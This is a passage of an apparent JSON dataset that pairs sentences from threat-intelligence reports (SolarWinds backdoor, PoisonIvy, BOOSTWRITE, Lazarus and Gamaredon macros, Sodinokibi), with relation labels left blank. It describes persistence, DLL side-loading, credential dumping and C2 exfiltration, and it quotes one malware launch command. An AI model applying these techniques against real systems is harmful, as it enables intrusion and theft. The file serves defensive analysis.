        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S13<=>S18",
        "S1": "The most common credential stealing tool used by the threat actor was a modified mimikatz that dumps NTLM hashes.",
        "S2": "In order to obtain credentials, the threat actor used another technique that can be seen in the below screenshots.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S13<=>S15",
        "S1": "The most common credential stealing tool used by the threat actor was a modified mimikatz that dumps NTLM hashes.",
        "S2": "The dumped hashes were used to authenticate to other machines via pass the hash.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S14<=>S16",
        "S1": "This version of mimikatz did not require any command line arguments, most likely in an attempt to avoid detection based on command-line auditing.",
        "S2": "We renamed this sample to maybemimi.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S16<=>S48",
        "S1": "We renamed this sample to maybemimi.exe.",
        "S2": "PIVY\u2019s use of DLL side-loading to abuse Samsung tools is not new, and has been reported previously by Palo Alto.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S17<=>S39",
        "S1": "Reverse engineering shows the similarity between maybemimi.exe and mimikatz.",
        "S2": "We assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S20<=>S23",
        "S1": "Once the threat actor mapped the network and obtained credentials (through net use), they began to move laterally.",
        "S2": "The following example demonstrates how the threat actor moved laterally from the first machine, compromised by the modified version of the China Chopper web shell, to other machines inside the network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S25<=>S40",
        "S1": "By creating these accounts, they ensured they would maintain access between different waves of the attack.",
        "S2": "The strain of PIVY in this attack used a DLL side-loading technique to stealthily load itself into memory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S28<=>S39",
        "S1": "A second method the threat actor used to maintain access across the compromised assets was through the deployment of the PoisonIvy RAT (PIVY).",
        "S2": "We assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S31<=>S64",
        "S1": "Among its most notable features are:",
        "S2": "Since the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S39<=>S51",
        "S1": "We assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.",
        "S2": "In later stages of the attack, the threat actor deployed two other custom-built web shells.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S39<=>S64",
        "S1": "We assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.",
        "S2": "Since the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S40<=>S51",
        "S1": "The strain of PIVY in this attack used a DLL side-loading technique to stealthily load itself into memory.",
        "S2": "In later stages of the attack, the threat actor deployed two other custom-built web shells.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S42<=>S46",
        "S1": "The PIVY payload was dropped along with the trusted and signed Samsung tool (RunHelp.exe) in the following manner:",
        "S2": "- After the fake DLL was loaded by the Samsung tool, it decrypted a blob payload in the same folder, which contains the actual PIVY payload.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S46<=>S48",
        "S1": "- After the fake DLL was loaded by the Samsung tool, it decrypted a blob payload in the same folder, which contains the actual PIVY payload.",
        "S2": "PIVY\u2019s use of DLL side-loading to abuse Samsung tools is not new, and has been reported previously by Palo Alto.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S48<=>S50",
        "S1": "PIVY\u2019s use of DLL side-loading to abuse Samsung tools is not new, and has been reported previously by Palo Alto.",
        "S2": "\u26a0\ufe0f Note: Our team has reached out to and advised the targeted organizations on active containment actions.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S51<=>S58",
        "S1": "In later stages of the attack, the threat actor deployed two other custom-built web shells.",
        "S2": "The contents of the compressed data was crucial in understanding the threat actor\u2019s motivation for the attack, as well as what type of information they were after.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S52<=>S54",
        "S1": "From these web shells, they launched reconnaissance commands, stole data, and dropped additional tools including portqry.exe, renamed cmd.exe, winrar, and the notorious hTran.",
        "S2": "In an attempt to hide the contents of the stolen data, the threat actor used winrar to compress and password-protect it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S54<=>S56",
        "S1": "In an attempt to hide the contents of the stolen data, the threat actor used winrar to compress and password-protect it.",
        "S2": "This threat actor is known to stage the data in multi-part archives before exfiltration.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S60<=>S62",
        "S1": "This \u2018connection bouncer\u2019 tool lets the threat actor redirect ports and connections between different networks and obfuscate C2 server traffic.",
        "S2": "The threat actor made some modifications to the original source code of hTran.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S62<=>S64",
        "S1": "The threat actor made some modifications to the original source code of hTran.",
        "S2": "Since the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-323.md::S64<=>S66",
        "S1": "Since the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.",
        "S2": "By looking at the original source code, we were able to identify that this is supposed to be \u201cConnect error\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S1<=>S6",
        "S1": "The attackers had to find a suitable place in this DLL component to insert their code.",
        "S2": "A quick look at the architecture of this DLL shows that RefreshInternal is part of the class SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager and is invoked by a sequence of methods that can be traced back to the CoreBusinessLayerPlugin class.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S2<=>S11",
        "S1": "Ideally, they would choose a place in a method that gets invoked periodically, ensuring both execution and persistence, so that the malicious code is guaranteed to be always up and running.",
        "S2": "The threat actors were savvy enough to avoid give-away terminology like \u201cbackdoor\u201d, \u201ckeylogger\u201d, etc., and instead opted for a more neutral jargon.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S2<=>S8",
        "S1": "Ideally, they would choose a place in a method that gets invoked periodically, ensuring both execution and persistence, so that the malicious code is guaranteed to be always up and running.",
        "S2": "Among those tasks is Background Inventory, which ultimately starts the malicious code.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S4<=>S6",
        "S1": "The modification to this function is very lightweight and could be easily overlooked\u2014all it does is to execute the method OrionImprovementBusinessLayer.Initialize within a parallel thread, so that the normal execution flow of RefreshInternal is not altered.",
        "S2": "A quick look at the architecture of this DLL shows that RefreshInternal is part of the class SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager and is invoked by a sequence of methods that can be traced back to the CoreBusinessLayerPlugin class.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S7<=>S12",
        "S1": "The purpose of this class, which initiates its execution with a method named Start (likely at an early stage when the DLL is loaded), is to initialize various other components and schedule the execution of several tasks.",
        "S2": "At first glance, the code in this DLL looks normal and doesn\u2019t raise suspicions, which could be part of the reason why the insertion of malicious code was undetected for months, especially if the code for this DLL was not frequently updated.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S9<=>S13",
        "S1": "The functionality of the backdoor resides entirely in the class OrionImprovementBusinessLayer, comprising 13 subclasses and 16 methods.",
        "S2": "To have some minimal form of obfuscation from prying eyes, the strings in the backdoor are compressed and encoded in Base64, or their hashes are used instead.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S11<=>S31",
        "S1": "The threat actors were savvy enough to avoid give-away terminology like \u201cbackdoor\u201d, \u201ckeylogger\u201d, etc., and instead opted for a more neutral jargon.",
        "S2": "The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it\u2019s executing from a trusted, signed binary.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S15<=>S27",
        "S1": "It carries out several checks to verify that it is running in a real victim\u2019s environment:",
        "S2": "If any of these checks fail, the backdoor terminates.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S19<=>S23",
        "S1": "- It verifies that the domain name of the current device meets the following conditions:",
        "S2": "- It checks that there are no running processes related to security-related software (e.g., Windbg, Autoruns, Wireshark)",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S27<=>S29",
        "S1": "If any of these checks fail, the backdoor terminates.",
        "S2": "After the extensive validation described above, the backdoor enters its main execution stage.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S30<=>S32",
        "S1": "At its core, the backdoor is a very standard one that receives instructions from the C2 server, executes those instructions, and sends back information.",
        "S2": "In its first step, the backdoor initiates a connection to a predefined C2 server to report some basic information about the compromised system and receive the first commands.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S31<=>S50",
        "S1": "The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it\u2019s executing from a trusted, signed binary.",
        "S2": "In a nutshell, these commands allow the attackers to run, stop, and enumerate processes; read, write, and enumerate files and registry keys; collect and upload information about the device; and restart the device, wait, or exit.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S31<=>S33",
        "S1": "The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it\u2019s executing from a trusted, signed binary.",
        "S2": "The C2 domain is composed of four different parts: three come from strings that are hardcoded in the backdoor, and one component is generated dynamically based on some unique information extracted from the device.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S32<=>S46",
        "S1": "In its first step, the backdoor initiates a connection to a predefined C2 server to report some basic information about the compromised system and receive the first commands.",
        "S2": "It then sends this JSON document to the C2 server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S33<=>S36",
        "S1": "The C2 domain is composed of four different parts: three come from strings that are hardcoded in the backdoor, and one component is generated dynamically based on some unique information extracted from the device.",
        "S2": "The dynamically generated portion of the domain is the interesting part.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S33<=>S39",
        "S1": "The C2 domain is composed of four different parts: three come from strings that are hardcoded in the backdoor, and one component is generated dynamically based on some unique information extracted from the device.",
        "S2": "- The domain name of the device",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S33<=>S41",
        "S1": "The C2 domain is composed of four different parts: three come from strings that are hardcoded in the backdoor, and one component is generated dynamically based on some unique information extracted from the device.",
        "S2": "The backdoor also generates a pseudo-random URI that is requested on the C2 domain.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S36<=>S41",
        "S1": "The dynamically generated portion of the domain is the interesting part.",
        "S2": "The backdoor also generates a pseudo-random URI that is requested on the C2 domain.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S41<=>S44",
        "S1": "The backdoor also generates a pseudo-random URI that is requested on the C2 domain.",
        "S2": "Here are examples of final URLs generated by the backdoor:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S47<=>S49",
        "S1": "If the communication is successful, the C2 responds with an encoded, compressed buffer of data containing commands for the backdoor to execute.",
        "S2": "The backdoor accepts the following commands:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S49<=>S65",
        "S1": "The backdoor accepts the following commands:",
        "S2": "The backdoor also allows the attackers to deliver second-stage payloads, which are part of the Cobalt Strike software suite.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S50<=>S60",
        "S1": "In a nutshell, these commands allow the attackers to run, stop, and enumerate processes; read, write, and enumerate files and registry keys; collect and upload information about the device; and restart the device, wait, or exit.",
        "S2": "Once backdoor access is obtained, the attackers follow the standard playbook of privilege escalation exploration, credential theft, and lateral movement hunting for high-value accounts and assets.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-326.md::S60<=>S65",
        "S1": "Once backdoor access is obtained, the attackers follow the standard playbook of privilege escalation exploration, credential theft, and lateral movement hunting for high-value accounts and assets.",
        "S2": "The backdoor also allows the attackers to deliver second-stage payloads, which are part of the Cobalt Strike software suite.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md::S0<=>S2",
        "S1": "BOOSTWRITE is a loader crafted to be launched via abuse of the DLL search order of applications which load the legitimate \u2018Dwrite.dll\u2019 provided by the Microsoft DirectX Typography Services.",
        "S2": "Mandiant identified instances where BOOSTWRITE was placed on the file system alongside the RDFClient binary to force the application to import DWriteCreateFactory from it rather than the legitimate DWrite.dll.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md::S2<=>S12",
        "S1": "Mandiant identified instances where BOOSTWRITE was placed on the file system alongside the RDFClient binary to force the application to import DWriteCreateFactory from it rather than the legitimate DWrite.dll.",
        "S2": "Before exiting, the malware resolves the location of the benign DWrite.dll library and passes the execution control to its DWriteCreateFactory method.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md::S3<=>S6",
        "S1": "Once loaded, `DWrite.dll` connects to a hard-coded IP and port from which it retrieves a decryption key and initialization vector (IV) to decrypt two embedded payload DLLs.",
        "S2": "Part of the decoded data is an IP address and port which are used to retrieve the key and the IV for the decryption of the embedded payloads.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md::S5<=>S8",
        "S1": "Next, the malware scans its own image to find the location of a 32-byte long multi-XOR key which is used to decode data inside its body.",
        "S2": "Once the key and the IV are downloaded the malware decrypts the embedded payloads and performs sanity checks on the results.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md::S6<=>S8",
        "S1": "Part of the decoded data is an IP address and port which are used to retrieve the key and the IV for the decryption of the embedded payloads.",
        "S2": "Once the key and the IV are downloaded the malware decrypts the embedded payloads and performs sanity checks on the results.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md::S8<=>S10",
        "S1": "Once the key and the IV are downloaded the malware decrypts the embedded payloads and performs sanity checks on the results.",
        "S2": "The malware logs various plaintext messages to the previously created logfile %TEMP%\\~rds<rnd_numbers> which are indicative of the loader\u2019s execution progress.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md::S10<=>S12",
        "S1": "The malware logs various plaintext messages to the previously created logfile %TEMP%\\~rds<rnd_numbers> which are indicative of the loader\u2019s execution progress.",
        "S2": "Before exiting, the malware resolves the location of the benign DWrite.dll library and passes the execution control to its DWriteCreateFactory method.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md::S13<=>S18",
        "S1": "The malware decrypts and loads two payload DLLs.",
        "S2": "Furthermore, this enables the malware to alter the user\u2019s last input time to ensure application sessions do not time out.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md::S15<=>S17",
        "S1": "RDFSNIFFER is a module loaded by BOOSTWRITE which allows an attacker to monitor and tamper with legitimate connections made via NCR Corporation\u2019s \u2018Aloha Command Center Client\u2019 (RDFClient), an application designed to provide visibility and system management capabilities to remote IT techs.",
        "S2": "When the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interface (Table 1).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md::S17<=>S20",
        "S1": "When the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interface (Table 1).",
        "S2": "This backdoor allows an attacker to upload, download, execute and/or delete arbitrary files (Table 2).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-349.md::S17<=>S19",
        "S1": "When the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interface (Table 1).",
        "S2": "This module also contains a backdoor component that enables it to inject commands into an active RDFClient session.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md::S1<=>S31",
        "S1": "We were able to identify two variants of this campaign that possibly have been distributed between May 12th and 31st:",
        "S2": "At the time of analysis, the server was down so we weren't able to clearly identify the ultimate goal of this attack.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md::S6<=>S8",
        "S1": "The LNK file contains a list of commands that will be executed upon running, and a blob that is a base64 encoded compressed payload.",
        "S2": "- Copy content of the LNK file into \"g4ZokyumB2DC4.tmp\" in %APPDATA% temp directory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md::S12<=>S14",
        "S1": "- Decompress content of \"o423DFDS4.tmp\" in temp directory along with a decoy PDF document using \"expand.exe -F:*\" (Figure 3) .",
        "S2": "- Execute the JS file by calling Wscript.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md::S15<=>S20",
        "S1": "- Open the decoy document.",
        "S2": "The JavaScript file performs the following commands:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md::S16<=>S34",
        "S1": "The list of commands executed by this LNK shortcut is the same as the one reported by Anomali on the Higasia Covid-19 campaign.",
        "S2": "Malwarebytes (in this case the Nebula business version) stopped the LNK file execution from WinRAR and therefore completely stopped the attack.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md::S23<=>S26",
        "S1": "- Copy \"svchhast.exe\" into startup directory and rename it as \"officeupdate.exe\".",
        "S2": "Svchast.exe is a small loader that loads the content of the shellcode stored in \"66DF3DFG.tmp\".",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-385.md::S31<=>S33",
        "S1": "At the time of analysis, the server was down so we weren't able to clearly identify the ultimate goal of this attack.",
        "S2": "We reproduced this attack in our lab using an email as the infection vector, as we surmise that victims were spear-phished.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md::S0<=>S6",
        "S1": "The Gamaredon group uses a package that includes a custom Microsoft Outlook Visual Basic for Applications (VBA) project.",
        "S2": "They have been using this module in three different ways to send malicious email to:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md::S0<=>S2",
        "S1": "The Gamaredon group uses a package that includes a custom Microsoft Outlook Visual Basic for Applications (VBA) project.",
        "S2": "This bundle of malicious code starts out with a VBScript that first kills the Outlook process if it is running, and then removes security around VBA macro execution in Outlook by changing registry values.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md::S3<=>S10",
        "S1": "It also saves to disk the malicious OTM file (Outlook VBA project) that contains a macro, the malicious email attachment and, in some cases, a list of recipients that the emails should be sent to.",
        "S2": "While abusing a compromised mailbox to send malicious emails without the victim\u2019s consent is not a new technique, we believe this is the first publicly documented case of an attack group using an OTM file and Outlook macro to achieve it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md::S4<=>S10",
        "S1": "Next, it relaunches Outlook with a special option, /altvba <OTM filename>, which loads the Gamaredon VBA project.",
        "S2": "While abusing a compromised mailbox to send malicious emails without the victim\u2019s consent is not a new technique, we believe this is the first publicly documented case of an attack group using an OTM file and Outlook macro to achieve it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md::S4<=>S6",
        "S1": "Next, it relaunches Outlook with a special option, /altvba <OTM filename>, which loads the Gamaredon VBA project.",
        "S2": "They have been using this module in three different ways to send malicious email to:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md::S4<=>S11",
        "S1": "Next, it relaunches Outlook with a special option, /altvba <OTM filename>, which loads the Gamaredon VBA project.",
        "S2": "Based on the \u201csend to all in contact list\u201d behavior of this malicious VBA code, we believe that this module might have led some organizations to think they were targeted by Gamaredon when they were merely collateral damage.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md::S5<=>S11",
        "S1": "The malicious code is executed once the Application.Startup event is received.",
        "S2": "Based on the \u201csend to all in contact list\u201d behavior of this malicious VBA code, we believe that this module might have led some organizations to think they were targeted by Gamaredon when they were merely collateral damage.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md::S6<=>S11",
        "S1": "They have been using this module in three different ways to send malicious email to:",
        "S2": "Based on the \u201csend to all in contact list\u201d behavior of this malicious VBA code, we believe that this module might have led some organizations to think they were targeted by Gamaredon when they were merely collateral damage.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md::S6<=>S19",
        "S1": "They have been using this module in three different ways to send malicious email to:",
        "S2": "This was fixed in a later version of this module \u2014 another example of the Gamaredon group\u2019s fast development pace and apparent lack of attention to detail.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md::S12<=>S15",
        "S1": "For example, recent samples uploaded to VirusTotal coming from regions that are not traditionally targeted by Gamaredon, such as Japan, could be explained by the actions of this module.",
        "S2": "These are very similar to the content of the malicious attachments used in Gamaredon\u2019s initial spearphishing campaigns.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md::S13<=>S16",
        "S1": "As seen in Figure 2, the VBA code builds the email body and attaches the malicious document to the email.",
        "S2": "Figure 3 shows an email generated by this malicious component.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md::S16<=>S18",
        "S1": "Figure 3 shows an email generated by this malicious component.",
        "S2": "However, as illustrated in Figure 3, there is a problem with the Russian encoding.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-398.md::S16<=>S19",
        "S1": "Figure 3 shows an email generated by this malicious component.",
        "S2": "This was fixed in a later version of this module \u2014 another example of the Gamaredon group\u2019s fast development pace and apparent lack of attention to detail.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md::S0<=>S24",
        "S1": "We identified two phishing documents: \u201cLockheed_Martin_JobOpportunities.docx\u201d and \u201cSalary_Lockheed_Martin_job_opportunities_confidential.doc\u201d.",
        "S2": "Unfortunately, we were unable to get further details about the remote htm payload as it returns a 404 error.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md::S6<=>S15",
        "S1": "Interestingly, to make the macro seem more innocuous, Lazarus uses function names identical to the exported functions of WMVCORE.DLL and variable names thematically related to playback (fig. 4).",
        "S2": "Lazarus has also used other novel methods to execute shellcode such as by using the function EnumSystemLocalesA as a callback to shellcode written to executable heap.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md::S7<=>S9",
        "S1": "The macro uses a check for a document variable before entering its main functionality block.",
        "S2": "The second stage payload is shellcode that is embedded as a base64 encoded string array inside the macro that is decoded by using CryptStringToBinaryW (fig. 5).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-414.md::S9<=>S16",
        "S1": "The second stage payload is shellcode that is embedded as a base64 encoded string array inside the macro that is decoded by using CryptStringToBinaryW (fig. 5).",
        "S2": "The macro then sets a document variable to ensure that subsequent runs would not execute the shellcode decode and the KernelCllbackTable hijack again.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S0<=>S2",
        "S1": "The malicious document contains two payloads as encrypted string arrays embedded in Visual Basic macro code.",
        "S2": "The VBA Macro code is self-executing and configured to execute when the OLE document (MS Word doc) is opened (via \u201cSub AutoOpen()\u201d).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S3<=>S7",
        "S1": "The AutoOpen() function in the VBA Macro performs the following tasks in the sequence listed:",
        "S2": "- After writing the second stage payload to disk the VBA code performs two important actions.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S4<=>S7",
        "S1": "- Decodes the target file path of the second stage binary payload.",
        "S2": "- After writing the second stage payload to disk the VBA code performs two important actions.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S5<=>S12",
        "S1": "This file path is calculated based on the current user\u2019s Temp folder location: <temp_dir_path>\\.\\lsm.exe",
        "S2": "- Adds persistence on the system by creating a shortcut in the user\u2019s Startup folder with the correct cmdline arguments:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S7<=>S15",
        "S1": "- After writing the second stage payload to disk the VBA code performs two important actions.",
        "S2": "- Once the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S9<=>S11",
        "S1": "This is done so that the cmd.exe process exists as soon as the payload is launched.",
        "S2": "cmdline for executing the second stage binary: cmd.exe /c start /b <temp_dir_path>\\.\\lsm.exe /haobao",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S11<=>S15",
        "S1": "cmdline for executing the second stage binary: cmd.exe /c start /b <temp_dir_path>\\.\\lsm.exe /haobao",
        "S2": "- Once the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S12<=>S15",
        "S1": "- Adds persistence on the system by creating a shortcut in the user\u2019s Startup folder with the correct cmdline arguments:",
        "S2": "- Once the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S15<=>S17",
        "S1": "- Once the second stage payload has been launched, the VBA Macro proceeds to display a decoy document to the end user.",
        "S2": "The decoy document is again written to the user\u2019s temp directory to the following filename/path: <temp_dir_path>\\.\\Job Description.doc",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S16<=>S18",
        "S1": "This decoy document is also stored in the VBA Macro as an encrypted string array (similar to the second stage payload).",
        "S2": "- Once the decoy document has been written to disk, the VBA Macro sets its file attributes to System + Hidden",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S17<=>S19",
        "S1": "The decoy document is again written to the user\u2019s temp directory to the following filename/path: <temp_dir_path>\\.\\Job Description.doc",
        "S2": "- The decoy document is then opened by the malicious VBA Macro and the original malicious document\u2019s caption is copied over to the decoy document to trick the end user into mistaking the decoy document for the original (malicious) document.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S21<=>S34",
        "S1": "- Since the decoy document is a benign file and does not contain any macros the victim does not suspect any malicious behavior.",
        "S2": "The implant has the capability of gathering data from the victim\u2019s system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S24<=>S28",
        "S1": "If the malware does not find this string in its cmdline arguments, it simply quits without going any further.",
        "S2": "- As part of Reflective DLL loading the malware performs the following tasks on the DLL it has unwrapped in memory:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S25<=>S28",
        "S1": "- Unwraps a DLL into memory and calls its one-and-only import using Reflective DLL injection.",
        "S2": "- As part of Reflective DLL loading the malware performs the following tasks on the DLL it has unwrapped in memory:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S28<=>S34",
        "S1": "- As part of Reflective DLL loading the malware performs the following tasks on the DLL it has unwrapped in memory:",
        "S2": "The implant has the capability of gathering data from the victim\u2019s system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S34<=>S39",
        "S1": "The implant has the capability of gathering data from the victim\u2019s system.",
        "S2": "- The malware appends an indicator (flag) specifying whether the above registry key was found in the user\u2019s registry:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S39<=>S41",
        "S1": "- The malware appends an indicator (flag) specifying whether the above registry key was found in the user\u2019s registry:",
        "S2": "In preparation of the exfiltration of information collected from the endpoint, the malware performs the following activities:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S39<=>S47",
        "S1": "- The malware appends an indicator (flag) specifying whether the above registry key was found in the user\u2019s registry:",
        "S2": "Persistence is established for the implant via the visual basic macro code initially executed upon document loading by the victim.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S41<=>S45",
        "S1": "In preparation of the exfiltration of information collected from the endpoint, the malware performs the following activities:",
        "S2": "Once the malware has performed all these activities it sends an HTTP POST request to the CnC server:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S41<=>S51",
        "S1": "In preparation of the exfiltration of information collected from the endpoint, the malware performs the following activities:",
        "S2": "Value written to registry to achieve persistence on the endpoint:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-416.md::S46<=>S48",
        "S1": "The persistence mechanism of the malware is performed only for the downloaded implant.",
        "S2": "This persistence is also performed ONLY if the malware successfully executes the downloaded implant.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S0<=>S2",
        "S1": "Spearphishing Attachment (ATT&CK T1193) is one of the most used Initial Access techniques used by ransomware families as in Sodinokibi.",
        "S2": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S1<=>S5",
        "S1": "Attackers use spam emails with an attached MS Office Word document including a malicious macro to download the ransomware to the target system.",
        "S2": "\u201cBewerbungsunterlagen\u201d means \u201capplication document\u201d in German, and the attackers used a CV theme to lure victims into downloading the document.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S1<=>S14",
        "S1": "Attackers use spam emails with an attached MS Office Word document including a malicious macro to download the ransomware to the target system.",
        "S2": "It reveals that a macro is embedded in the document (Scripting, ATT&CK T1054).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S2<=>S5",
        "S1": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
